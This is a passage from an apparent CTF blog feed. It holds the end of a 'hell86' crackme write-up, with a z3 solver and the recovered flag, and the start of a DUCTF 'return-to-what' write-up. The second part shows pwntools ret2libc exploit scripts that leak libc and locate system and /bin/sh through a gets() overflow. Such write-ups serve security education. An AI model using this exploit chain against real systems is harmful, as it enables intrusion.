0x1430: push rsi
0x143e: rdi, rsi &amp;lt;&amp;lt; 0x3
0x144c: call 0x0
0x145a: pop rsi
0x1468: pop rdi
0x1476: if rax = 0 ret
0x1484: r8 = rax
0x1492: r9 = rax
0x14a0: push r9
0x14ae: push r8
0x14bc: push rdi
0x14ca: push rsi
0x14d8: rsi = byte [rdi&amp;#43;0x0]
0x14e6: rdi = 0x20a0
0x14f4: call 0x18c8
0x1502: pop rsi
0x1510: pop rdi
0x151e: pop r8
0x152c: pop r9
0x153a: if rax = 0 jmp 0x15c6
0x1548: r10 = 0x20a0
0x1556: rax = rax - r10
0x1564: mov qword [r9&amp;#43;0x0], rax
0x1572: lea r9, [r9 &amp;#43; 0x8]
0x1580: lea rdi, [rdi &amp;#43; 0x1]
0x158e: lea rsi, [rsi &amp;#43; 0xffffffffffffffff]
0x159c: if rsi != 0 jmp 0x14a0
0x15aa: rax = r8
0x15b8: ret
0x15c6: rdi = r8
0x15d4: call 0x0
0x15e2: rax = 0x0
0x15f0: ret
0x15fe: rax = 0x1
0x160c: if rsi = 0 ret
0x161a: r8 = qword [rdi&amp;#43;0x0]
0x1628: r8 != 0x16 ; r8 = 1
0x1636: if r8 != 0 ret
0x1644: push rdi
0x1652: push rsi
0x1660: call 0x1724
0x166e: pop rsi
0x167c: pop rdi
0x168a: lea rsi, [rsi &amp;#43; 0xffffffffffffffff]
0x1698: push rdi
0x16a6: rdx, rsi &amp;lt;&amp;lt; 0x3
0x16b4: rsi = 0x1fa0
0x16c2: call 0x182e
0x16d0: pop rdi
0x16de: r8 = rax
0x16ec: rax = 0x1
0x16fa: if r8 != 0 ret
0x1708: rax = 0x0
0x1716: ret
0x1724: if rsi = 0 ret
0x1732: lea rsi, [rsi &amp;#43; 0xffffffffffffffff]
0x1740: if rsi = 0 ret
0x174e: r8 = qword [rdi&amp;#43;0x0]
0x175c: r9 = qword [rdi&amp;#43;0x8]
0x176a: r8 = r9 - r8
0x1778: r8 = r8 ^ rsi
0x1786: r9 = r8 * r8
0x1794: r8 = r9 * r8
0x17a2: mov qword [rdi&amp;#43;0x0], r8
0x17b0: lea rdi, [rdi &amp;#43; 0x8]
0x17be: lea rsi, [rsi &amp;#43; 0xffffffffffffffff]
0x17cc: rip = 0x1740
0x17da: rax = 0x0
0x17e8: r10 = byte [rdi&amp;#43;0x0]
0x17f6: if r10 = 0 ret
0x1804: lea rdi, [rdi &amp;#43; 0x1]
0x1812: lea rax, [rax &amp;#43; 0x1]
0x1820: rip = 0x17e8
0x182e: rax = 0x0
0x183c: if rdx = 0 ret
0x184a: r8 = byte [rdi&amp;#43;0x0]
0x1858: r9 = byte [rsi&amp;#43;0x0]
0x1866: r8 = r8 ^ r9
0x1874: rax = rax | r8
0x1882: lea rdx, [rdx &amp;#43; 0xffffffffffffffff]
0x1890: lea rdi, [rdi &amp;#43; 0x1]
0x189e: lea rsi, [rsi &amp;#43; 0x1]
0x18ac: if rdx != 0 jmp 0x184a
0x18ba: ret
0x18c8: rax = rdi
0x18d6: r8 = byte [rax&amp;#43;0x0]
0x18e4: if r8 = 0 jmp 0x192a
0x18f2: r8 == rsi ; r8 = 1
0x1900: if r8 != 0 ret
0x190e: lea rax, [rax &amp;#43; 0x1]
0x191c: rip = 0x18d6
0x192a: rax = 0x0
0x1938: ret
&lt;/code>&lt;/pre>
&lt;/div>
&lt;h2 id="flag-verification">Flag verification&lt;/h2>
&lt;p>The actual verification goes like this&lt;/p>
&lt;ul>
&lt;li>if argc != 2 ; returns&lt;/li>
&lt;li>if input != len(flag) ; returns&lt;/li>
&lt;li>if input doesn&amp;rsquo;t start with &lt;code>FLAG{&lt;/code> ; returns&lt;/li>
&lt;li>if input doesn&amp;rsquo;t end with &lt;code>}&lt;/code> ; returns&lt;/li>
&lt;li>if flag[0] != &lt;code>x&lt;/code> ; returns&lt;/li>
&lt;li>now it verifies our flag with a global array of and checks if the indices of flag are correct&lt;/li>
&lt;li>now it compares it with a array at &lt;code>0x1fa0&lt;/code> and if they are equal returns 0 and prints &lt;code>OK!&lt;/code> if its correct or else it prints &lt;code>Wrong&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>To verify the indices of the flag of which is between 30 characters with the global array it uses this algorithm&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">iterates over &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> times cause the len of the flag will be reduced &lt;span style="color:#66d9ef">as&lt;/span> we already know the first character which &lt;span style="color:#f92672">is&lt;/span> x
r8 &lt;span style="color:#f92672">=&lt;/span> qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x0&lt;/span>]
r9 &lt;span style="color:#f92672">=&lt;/span> qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>]
r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">-&lt;/span> r8
r8 &lt;span style="color:#f92672">=&lt;/span> r8 &lt;span style="color:#f92672">^&lt;/span> rsi
r9 &lt;span style="color:#f92672">=&lt;/span> r8 &lt;span style="color:#f92672">*&lt;/span> r8
r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">*&lt;/span> r8
mov qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x0&lt;/span>], r8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The solve script using z3&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> z3 &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
characters &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;#39;&lt;/span>
hash &lt;span style="color:#f92672">=&lt;/span> [
&lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29791&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>, &lt;span style="color:#ae81ff">13824&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">6859&lt;/span>, &lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29791&lt;/span>, &lt;span style="color:#ae81ff">24389&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">10648&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">24389&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">13824&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">17576&lt;/span>, &lt;span style="color:#ae81ff">2744&lt;/span>,
&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">17576&lt;/span>, &lt;span style="color:#ae81ff">19683&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">32768&lt;/span>, &lt;span style="color:#ae81ff">729&lt;/span>, &lt;span style="color:#ae81ff">19683&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">729&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span>, &lt;span style="color:#ae81ff">125&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#ae81ff">512&lt;/span>, &lt;span style="color:#ae81ff">512&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">6859&lt;/span>, &lt;span style="color:#ae81ff">8000&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>
]
x &lt;span style="color:#f92672">=&lt;/span> [BitVec(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;x[&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>i&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">30&lt;/span>)] &lt;span style="color:#75715e"># 30 char of input&lt;/span>
s &lt;span style="color:#f92672">=&lt;/span> Solver()
s&lt;span style="color:#f92672">.&lt;/span>add(x[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span>) &lt;span style="color:#75715e"># first char = x&lt;/span>
indices &lt;span style="color:#f92672">=&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">29&lt;/span>): &lt;span style="color:#75715e"># len of flag - 1&lt;/span>
r8 &lt;span style="color:#f92672">=&lt;/span> x[i]
r9 &lt;span style="color:#f92672">=&lt;/span> x[i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">-&lt;/span> r8
r8 &lt;span style="color:#f92672">=&lt;/span> r8 &lt;span style="color:#f92672">^&lt;/span> (&lt;span style="color:#ae81ff">29&lt;/span> &lt;span style="color:#f92672">-&lt;/span> i) &lt;span style="color:#75715e"># rsi = 29 - i&lt;/span>
r9 &lt;span style="color:#f92672">=&lt;/span> r8 &lt;span style="color:#f92672">*&lt;/span> r8
r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">*&lt;/span> r8
indices&lt;span style="color:#f92672">.&lt;/span>append(r8)
i&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">29&lt;/span>):
s&lt;span style="color:#f92672">.&lt;/span>add(indices[i] &lt;span style="color:#f92672">==&lt;/span> hash[i])
s&lt;span style="color:#f92672">.&lt;/span>add(And(x[i] &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, x[i] &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span>))
flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>check() &lt;span style="color:#f92672">==&lt;/span> sat:
m &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>model()
&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">30&lt;/span>):
obj &lt;span style="color:#f92672">=&lt;/span> x[i]
flag &lt;span style="color:#f92672">+=&lt;/span> characters[m[obj]&lt;span style="color:#f92672">.&lt;/span>as_long()]
print(s&lt;span style="color:#f92672">.&lt;/span>assertions())
print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;FLAG&lt;/span>&lt;span style="color:#ae81ff">{{&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>flag&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#ae81ff">}}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And voila when we run the script we get the flag. We&amp;rsquo;ll check it actual binary which should print &lt;code>OK!&lt;/code> if its a valid flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> vm&lt;span style="color:#f92672">/&lt;/span>hell86&lt;span style="color:#f92672">/&lt;/span>solve &lt;span style="color:#f92672">./&lt;/span>solve
FLAG{x86&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>s&lt;span style="color:#f92672">-&lt;/span>s0&lt;span style="color:#f92672">-&lt;/span>fund4m3nt4lly&lt;span style="color:#f92672">-&lt;/span>br0k3n}
&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> vm&lt;span style="color:#f92672">/&lt;/span>hell86&lt;span style="color:#f92672">/&lt;/span>solve &lt;span style="color:#f92672">./&lt;/span>hell86 FLAG{x86&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>s&lt;span style="color:#f92672">-&lt;/span>s0&lt;span style="color:#f92672">-&lt;/span>fund4m3nt4lly&lt;span style="color:#f92672">-&lt;/span>br0k3n}
OK&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>That was an awesome crackme
&lt;img src="/images/wll_done.gif" alt="">&lt;/p></content></item><item><title>DUCTF-return-to-what</title><link>/posts/ductf-return-to-what/</link><pubDate>Tue, 22 Sep 2020 00:00:00 +0000</pubDate><guid>/posts/ductf-return-to-what/</guid><description>Leaking Libc addresses to do ret2libc with unknown libc First lets take a look at the binary mitigations
{} ret2what checksec return-to-what [*] &amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and no canary which makes it easier and ASLR is probably enabled.
Decompilation and Disassembly The decompilation of the assembly code looks like this</description><content>&lt;h2 id="leaking-libc-addresses-to-do-ret2libc-with-unknown-libc">Leaking Libc addresses to do ret2libc with unknown libc&lt;/h2>
&lt;p>First lets take a look at the binary mitigations&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and
no canary which makes it easier and ASLR is probably enabled.&lt;/p>
&lt;h2 id="decompilation-and-disassembly">Decompilation and Disassembly&lt;/h2>
&lt;p>The decompilation of the assembly code looks like this&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
undefined8 main&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
puts&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Today, we\&amp;#39;ll have a lesson in returns.&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
vuln&lt;span style="color:#f92672">()&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> 0;
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp
0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp &lt;span style="color:#75715e"># prologue&lt;/span>
0x00000000004011b1 &amp;lt;+4&amp;gt;: lea rdi,&lt;span style="color:#f92672">[&lt;/span>rip+0xe78&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># rdi = address of [rip+0xe78] &lt;/span>
0x00000000004011b8 &amp;lt;+11&amp;gt;: call 0x401030 &amp;lt;puts@plt&amp;gt; &lt;span style="color:#75715e"># call puts function&lt;/span>
0x00000000004011bd &amp;lt;+16&amp;gt;: mov eax,0x0 &lt;span style="color:#75715e"># eax = 0x0&lt;/span>
0x00000000004011c2 &amp;lt;+21&amp;gt;: call 0x401185 &amp;lt;vuln&amp;gt; &lt;span style="color:#75715e"># call vuln function which has the vulnerable gets function which we use to do bof&lt;/span>
0x00000000004011c7 &amp;lt;+26&amp;gt;: mov eax,0x0 &lt;span style="color:#75715e"># eax = 0x0&lt;/span>
0x00000000004011cc &amp;lt;+31&amp;gt;: pop rbp &lt;span style="color:#75715e"># epilogue&lt;/span>
0x00000000004011cd &amp;lt;+32&amp;gt;: ret
End of assembler dump.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In addition lets take a look at the &lt;code>vuln&lt;/code> function too&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
void vuln&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
char *s;
puts&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
gets&lt;span style="color:#f92672">(&lt;/span>&amp;amp;s&lt;span style="color:#f92672">)&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span>;
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>we know that gets is a vulnerable function which we can use to do a buffer overflow&lt;/p>
&lt;h2 id="gadgets">Gadgets&lt;/h2>
&lt;p>we&amp;rsquo;ll use the &lt;code>pop rdi&lt;/code> gadget which is needed to pass a parameter to the called function and
the &lt;code>ret&lt;/code> gadget to align our stack&lt;/p>
&lt;h2 id="leaking-address-of-libc">Leaking address of Libc&lt;/h2>
&lt;p>Now lets craft our exploit to leak address of libc and i previously found out the offset to do bof is &lt;code>56&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
&lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
&lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040122b&lt;/span>
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401016&lt;/span>
leak &lt;span style="color:#f92672">=&lt;/span> flat([
cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), p64(pop_rdi), exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>], exe&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>], exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;_start&amp;#39;&lt;/span>]
])
io&lt;span style="color:#f92672">.&lt;/span>sendline(leak)
io&lt;span style="color:#f92672">.&lt;/span>recvline()
io&lt;span style="color:#f92672">.&lt;/span>recvline()
recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
io&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here i leaked the address of &lt;code>__libc_start_main &lt;/code>&lt;/p>
&lt;p>Now lets run our exploit script in order to leak libc address&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp/return-to-what&amp;#39;&lt;/span>
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x3ff000&lt;span style="color:#f92672">)&lt;/span>
RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp&amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp/return-to-what&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">4000&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> __libc_start_main leak 0x7f1d48463ab0
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we leaked our libc address which is &lt;code>0x7f1d48463ab0&lt;/code>, lets find the version of libc now in order to calculate offset of other libc functions&lt;/p>
&lt;p>Lets use libc database search to find the version of libc &amp;raquo;
&lt;a href="https://libc.blukat.me/">Libc Database&lt;/a>&lt;/p>
&lt;p>&lt;img src="/images/libc-database.png" alt="">&lt;/p>
&lt;p>Now that we found out the libc version, here i assumed it to be the first libc so i choose to use &lt;code>libc6_2.27-3ubuntu1_amd64.so&lt;/code>&lt;/p>
&lt;p>Lets craft our final exploit script and run in on the remote server to get a shell and grab our flag 🚩&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
&lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
&lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040122b&lt;/span>
ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401016&lt;/span>
leak &lt;span style="color:#f92672">=&lt;/span> flat([
cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), p64(pop_rdi), exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>], exe&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>], exe&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;_start&amp;#39;&lt;/span>]
])
io&lt;span style="color:#f92672">.&lt;/span>sendline(leak)
io&lt;span style="color:#f92672">.&lt;/span>recvline()
io&lt;span style="color:#f92672">.&lt;/span>recvline()
recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_leak &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>]
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
bin_sh &lt;span style="color:#f92672">=&lt;/span> next(libc&lt;span style="color:#f92672">.&lt;/span>search(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>))
system &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>]
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
